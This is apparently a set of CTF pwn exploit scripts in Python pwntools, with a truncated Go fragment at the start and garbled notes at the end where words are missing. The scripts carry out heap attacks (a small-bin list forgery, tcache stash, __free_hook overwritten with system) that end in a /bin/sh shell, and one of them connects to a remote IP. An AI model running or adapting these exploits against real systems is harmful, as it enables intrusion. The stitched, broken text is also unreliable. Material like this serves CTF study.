    m, _ := new(big.Int).SetString(recv[20:end], 10)
    fmt.Printf("r%v\nm: %v\n", r, m)
    // calculation
    quotient := r / 1000
    remainder := r % 1000
    s := new(big.Int).Exp(big.NewInt(2), big.NewInt(1000), nil)
    t := big.NewInt(2)
    start := time.Now()
    for i := 0; i >")
    Num(n)
def Add(name, cont):
    Cmd(1)
    sh.recvuntil('name>')
    if(type(name)==type('')):
        sh.send(name)
    else:
        sh.sendline(chr(name))
    sh.recvuntil('content>')
    sh.send(cont)
def Delete(idx):
    Cmd(2)
    sh.recvuntil('index>')
    Num(idx)
def List(idx):
    Cmd(3)
    sh.recvuntil('index>')
    Num(idx)
def GDB():
    gdb.attach(sh, '''
    break *(0x0000555555554000+0x1656)
    telescope 0x0000555555554000+0x4840 16
    heap bins
    ''')
Add(1, 'A\n')
Add(2, 'B\n')
for i in range(7):
    Add('C'*0x10, str(i)+'\n')
#leak heap addr
List(0)
sh.recvuntil('C'*0x10)
heap_addr = u64(sh.recv(6).ljust(8, '\x00'))-0x1260
Log('heap_addr')
Delete(0)       # Tcahce[0x210] is full
Delete(2)       #UBB
Delete(1)       #UBAB
#leak libc addr
Add('\x80\n', 'Overflow\n') #ins_use[1]=1, UB(B, 0x1e0), SBA
List(1)
sh.recvuntil(' => ')
libc.address = u64(sh.recv(6).ljust(8, '\x00'))-0x1ebde0
Log('libc.address')
#double bin
Delete(1)   #SB[0x210]A, Tcache[0x210]A
#Small Bin Attack
exp = p64(0x123)            #fd = any
exp+= p64(heap_addr+0xa90)  #bk = SB0
Add(4, exp+'\n')
#forge Small Bin list: SBASB0SB1SB2, SB1 and SB2 are overlap
exp = '1'*0x40  #telescope 0x55555555b990-0x10 50
exp+= flat(0, 0x211, heap_addr+0xa30, libc.address+0x1ebde0) #SB2: SB1SmallBin
exp+= '2'*0x40
exp+= flat(0, 0x211, heap_addr+0xa90, heap_addr+0x9d0)  # SB1: SB0SB2
exp+= '3'*0x40
exp+= flat(0, 0x211, heap_addr+0x2c0, heap_addr+0xa30)  # SB0: ASB1
Add(5, exp+'\n')
#clean Tcache
for i in range(5):
    Add(5, str(i)+'\n')
#Trigger Small Bin Tcache Stash, Tcache->SB0->SB1->SB2
Add(5, '5\n')
#Tcache Attack
exp = 'A'*0x50
exp+= flat(0, 0x211, libc.symbols['__free_hook'], 0)
how2mutate
fuzzfreechunk
realloc0double freekeytcache
Add(5, exp+'\n')    #Tcache[0x210]->SB1->free hook
Add(5, 'CHH\n')
Add(5, flat(libc.symbols['system'])+'\n')
#getshell
Add(6, '/bin/sh\x00'+'\n')
Delete(6)
#GDB()
sh.interactive()
'''
flag{B4by_D0o0B13_F73e_1s_Re41ly_Ea5y}
'''
from pwn import *
from ctypes import CDLL
import fuckpy3
context.arch = 'amd64'
context.log_level = 'debug'
#p = process('./how2mutate')
p = remote('111.186.59.27', 12345)
#p = remote('0.0.0.0', 12345)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
def launch_gdb():
    # context.terminal = ['xfce4-terminal', '-x', 'sh', '-c'] 
    # gdb.attach(proc.pidof(p)[0]) 
    #os.system("gnome-terminal -- gdb -q ./how2mutate " + str(proc.pidof(p)[0]))
    print(str(proc.pidof(p)[0]))
def add(s,c):
    p.sendlineafter('>','1')
    p.sendlineafter(':',str(s))
    p.sendafter(':',c)
def mutate_seed(s):
    p.sendlineafter('>','2')
    p.sendlineafter(':',str(s))
def show():
    p.sendlineafter('>','3')
def delete(s):
    p.sendlineafter('>','4')
    p.sendlineafter(':',str(s))
def set_mutate(s):
    p.sendlineafter('>','5')
    p.sendlineafter(':',str(s))
def run():
    p.sendlineafter('>','6')
set_mutate(0)
add(0x80-1,'aaa')
add(0,'')
mutate_seed(1)
p.recvuntil('realloc(')
leak_heap = p.recvuntil(',',drop=True)
leak_heap = int(leak_heap,16)
#log.info('leak heap' + hex(leak_heap))
add(0,'')
add(0,'')
add(0x500,'aa')
add(0x30,'aa')
delete(1)
run()
sleep(0.1)
mutate_seed(2)
'''p.recvuntil('realloc(')
leak_heap = p.recvuntil(',',drop=True)
leak_heap = int(leak_heap,16)
log.info('leak heap' + hex(leak_heap))
'''
log.info('leak heap' + hex(leak_heap))
big_chunk = 528 + leak_heap
add(0x9,p64(big_chunk + 0x10))
add(0x9,p64(big_chunk + 0x10))
add(0x9,p64(big_chunk + 0x10))
delete(5)
show()
p.recvuntil('3: ')
leak_libc = p.recv(6) + b'\\x00\\x00'
leak_libc = u64(leak_libc) - 2014176
log.info('leak libc ' + hex(leak_libc))
add(0,'')
delete(1)
run()
sleep(0.1)
mutate_seed(5)
add(0x9,p64(leak_libc + libc.symbols['__free_hook']))
add(0x9,p64(leak_libc + libc.symbols['__free_hook']))
add(0x9,p64(libc.symbols['system'] + leak_libc))
add(0x100,'/bin/sh\\x00')
delete(7)
#input()
'''add(0x9,p64(0x154930 + leak_libc))
uc_masteeer
sys_call rdi =>  rsi => 1 rdx => 2 rcx => 3
 0: read(fd, buf_addr, size) 1: write(fd, buf_addr, size) 60: exit(code)
admin: jmp [0xBABECAFE008] -> tail main:  jmp [0xBABECAFE000] -> admin tail:  jmp [0xBABECAFE010] -> 
main
main  admin  is_admin = true,  jmp [0xBABECAFE000]  admin 
admin  echo  /bin/sh.
main  admin admin  admin 